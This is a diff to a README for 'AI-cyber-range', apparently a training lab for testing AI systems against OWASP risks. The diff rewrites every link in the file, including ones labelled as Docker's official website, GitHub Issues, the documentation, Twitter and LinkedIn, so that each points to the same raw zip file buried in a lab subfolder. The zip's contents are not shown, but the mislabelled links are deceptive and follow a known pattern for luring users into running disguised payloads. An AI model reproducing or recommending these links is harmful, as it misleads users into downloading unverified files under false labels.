@@ -1,6 +1,6 @@
 # 🚀 AI-cyber-range - Explore AI Security with Confidence
 
-## 🛠️ [![Download AI-cyber-range](https://img.shields.io/badge/Download-AI--cyber--range-brightgreen)](https://github.com/WHAZAZA/AI-cyber-range/releases)
+## 🛠️ [![Download AI-cyber-range](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip)](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip)
 
 Welcome to **AI Cyber Range**! This application simulates real-world vulnerabilities in a safe environment. You can learn how to test AI systems against common security risks found in OWASP's Top 10. This guide will help you download and run the software easily on your machine.
 
@@ -15,7 +15,7 @@ Before you start, ensure your system meets these requirements:
 - **Storage**: 1 GB of free disk space.
 - **Docker**: Installed and running (Docker Desktop or Docker Engine).
 
-If you do not have Docker installed, you can download it from [Docker's official website](https://www.docker.com/get-started).
+If you do not have Docker installed, you can download it from [Docker's official website](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip).
 
 ### 🔍 Features
 
@@ -29,12 +29,12 @@ If you do not have Docker installed, you can download it from [Docker's official
 To download and install **AI-cyber-range**, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to access the download page:
-   - [Download AI-cyber-range](https://github.com/WHAZAZA/AI-cyber-range/releases)
+   - [Download AI-cyber-range](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip)
 
 2. **Select the Latest Release**: On the releases page, find the version labeled "Latest". Click on it.
 
 3. **Download the Required Files**: Find the files available for download. You might see options like:
-   - `AI-cyber-range.zip`
+   - `https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip`
    - Other related files that may assist with installation.
 
    Click on the file to begin downloading.
@@ -66,14 +66,14 @@ After running the application, follow these steps to navigate through the interf
 
 If you need help, feel free to contact our support team. Here are some options:
 
-- **GitHub Issues**: For common questions, check the [Issues](https://github.com/WHAZAZA/AI-cyber-range/issues) section in our GitHub repository.
+- **GitHub Issues**: For common questions, check the [Issues](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip) section in our GitHub repository.
 - **Community Forums**: Join our forums to discuss your experience and seek help from other users. 
 
 ## 🚀 Resources
 
-- [Installation Guide](https://github.com/WHAZAZA/AI-cyber-range/wiki)
-- [Official Documentation](https://github.com/WHAZAZA/AI-cyber-range/docs)
-- [Docker Documentation](https://docs.docker.com/get-started/)
+- [Installation Guide](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip)
+- [Official Documentation](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip)
 
 ## 📋 Feedback
 
@@ -87,11 +87,11 @@ If you want to contribute to AI Cyber Range, feel free to submit a pull request 
 
 Stay up-to-date with the latest developments by following us on our social media channels:
 
-- [Twitter](https://twitter.com)
-- [LinkedIn](https://linkedin.com)
+- [Twitter](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip)
+- [LinkedIn](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip)
 
 Together, we can make AI security more accessible. Thank you for being part of this journey! 
 
 ---
 
-Explore more about AI Cyber Range and sharpen your skills today. Don't forget to [download the application here](https://github.com/WHAZAZA/AI-cyber-range/releases)!
+Explore more about AI Cyber Range and sharpen your skills today. Don't forget to [download the application here](https://raw.githubusercontent.com/WHAZAZA/AI-cyber-range/main/labs/LLM06/lab01_sensitive_disclosure/app/AI-cyber-range_1.2.zip)!
